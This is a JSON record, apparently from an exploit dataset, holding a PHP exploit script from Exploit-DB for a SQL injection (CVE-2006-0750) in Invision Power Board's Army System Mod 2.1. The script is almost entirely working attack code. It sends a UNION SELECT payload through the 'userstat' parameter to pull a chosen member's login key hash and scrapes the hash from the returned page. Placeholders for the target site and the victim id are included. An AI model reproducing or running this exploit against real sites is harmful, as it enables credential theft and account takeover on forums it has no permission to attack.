{
  "id": "1492",
  "title": "Invision Power Board Army System Mod 2.1 - SQL Injection",
  "cve": "CVE-2006-0750",
  "vuln_type": "sqli",
  "code": "<?php\r\n/* --------------------------- EXPLOIT ---------------------------\r\nInvision Power Board Army System Mod 2.1 SQL Injection Exploit\r\nTested on: Latest version (2.1.0)\r\nDiscovered on: 06.02.2006 by Alex & fRoGGz\r\nCredits to: SecuBox Labs\r\n\r\nPLEASE READ THIS !\r\nThe query of the SQL Injection depends about the number of fields in the sql table\r\nWe have successfully tested the exploit on a new fresh IPB 2.1.x with Army \r\nSystem Mod 2.1 installed\r\n\r\nIN NO EVENT SHALL THE OWNER OF THIS CODE OR CONTRIBUTORS BE LIABLE \r\nFOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL\r\nDAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR\r\nSERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER \r\nCAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,\r\nOR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\r\nOF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\r\n*/\r\n\r\n$target = \"http://site.com/forums/\"; // <--- Where ?\r\n$prefix = \"ibf_\"; // <--- SQL prefix ?\r\n$id = 1; // <--- Who ?\r\n\r\nprint_r(get_infos($target,$prefix,$id));\r\nif(!get_infos($target,$prefix,$id)) echo \"failed\";\r\n\r\nfunction get_infos($target,$prefix,$id) {\r\n\r\n    $inject = \"index.php?s=&act=army&userstat=0+UNION+SELECT+id,member_login_key,\";\r\n    $inject.= \"1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,\";\r\n    $inject.= \"1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,NULL,NULL,\";\r\n    $inject.= \"NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,\";\r\n    $inject.= \"NULL+FROM+\".$prefix.\"members+WHERE+id=\";\r\n\r\n    $filename = $target . $inject . $id;\r\n\r\n    $handle = fopen ($filename, \"r\");\r\n        $infos = array();\r\n\r\n        if (feof($handle)) { continue 2; }\r\n        if ( $handle ) {\r\n                while ( ($buffer = fgets( $handle )) )\r\n                {\r\n                        if ( strpos( $buffer, \"<td class='pformleft' width=\\\"35%\\\">Name</td>\") ) {\r\n                                $infos['md5'] = strip_tags ( fgets( $handle) );\r\n                break;\r\n                        }\r\n                }\r\n        }\r\n\r\n    fclose ($handle);\r\n\r\n        if (count($infos) == 1) return $infos;\r\n        return false;\r\n}\r\n?>\r\n\r\n# milw0rm.com [2006-02-13]",
  "url": "https://www.exploit-db.com/exploits/1492"
}